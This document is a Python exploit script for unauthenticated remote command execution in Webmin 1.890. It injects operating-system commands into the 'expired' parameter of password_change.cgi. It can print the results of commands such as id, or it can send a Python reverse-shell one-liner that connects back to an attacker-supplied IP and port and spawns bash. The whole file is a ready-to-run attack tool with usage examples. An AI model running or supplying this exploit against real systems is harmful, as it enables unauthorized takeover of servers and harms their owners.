import requests
import sys
import argparse
import re
import time

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit(url, command, shell, proxies=None):
    session = requests.Session()

    referer = {"Referer" : f'{url}/session_login.cgi'}
    payload = f'user=gotroot&pam=&expired=2|echo "";{command}'

    if shell:

        revshell(url, referer, session, proxies)
    else:
        r = session.post(url, headers=referer, data=payload, proxies=proxies, verify=False)
        # Split the text into lines
        lines = r.text.splitlines()
        # Remove the first two lines and the last line
        output = "\n".join(lines[2:-1])
        print(output)

def revshell(url, referer, session, proxies=None):
    lhost = input("Enter your ip address: ")
    lport = input("Enter your listening port: ")

    # Python reverse shell command
    command = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' '''
    payload = f'user=gotroot&pam=&expired=2|echo "";{command}'

    print(f"[+] Sending a shell to {lhost}:{lport}...")
    session.post(url, headers=referer, data=payload, proxies=proxies, verify=False)


def main():
    # Add an example of how the script is supposed to run
    example_text = '''
Example:
    python exploit.py -i 192.168.1.100
    python exploit.py -i 192.168.1.100 -p 10000 -c whoami
    python exploit.py -i 192.168.1.100 -x -c "ls -la"
    python exploit.py -i 192.168.1.100 --shell
    '''

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Exploit unauthenticated command execution in Webmin 1.890.", epilog=example_text,formatter_class=argparse.RawDescriptionHelpFormatter)

    # Create a group for required arguments
    required_group = parser.add_argument_group('required arguments')
    required_group.add_argument('-i', '--ip', help='Target ip address', required=True, metavar='IP Address')

    # Create a group for optional arguments
    optional_group = parser.add_argument_group('optional arguments')
    optional_group.add_argument('-p', '--port', help='Webmin port(default=10000)', required=False, metavar='Port number', default=10000)
    optional_group.add_argument('-c', '--command', help='OS Command to execute (Default=id)', required=False, metavar='Command', default='id')
    optional_group.add_argument('--shell', help='Get a reverse shell', required=False, action='store_true')
    optional_group.add_argument('-x', '--proxy', help='Sends requests through Burp Suite proxy at 127.0.0.1:8080.', action='store_true')
    args = parser.parse_args()

    ip = args.ip
    port = args.port
    command = args.command
    use_shell = args.shell
    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    url = f'https://{ip}:{port}/password_change.cgi'
    
    if args.proxy:
        exploit(url, command, use_shell, proxies=proxies)
    else:
        exploit(url, command, use_shell)



if __name__ == "__main__":
    main()
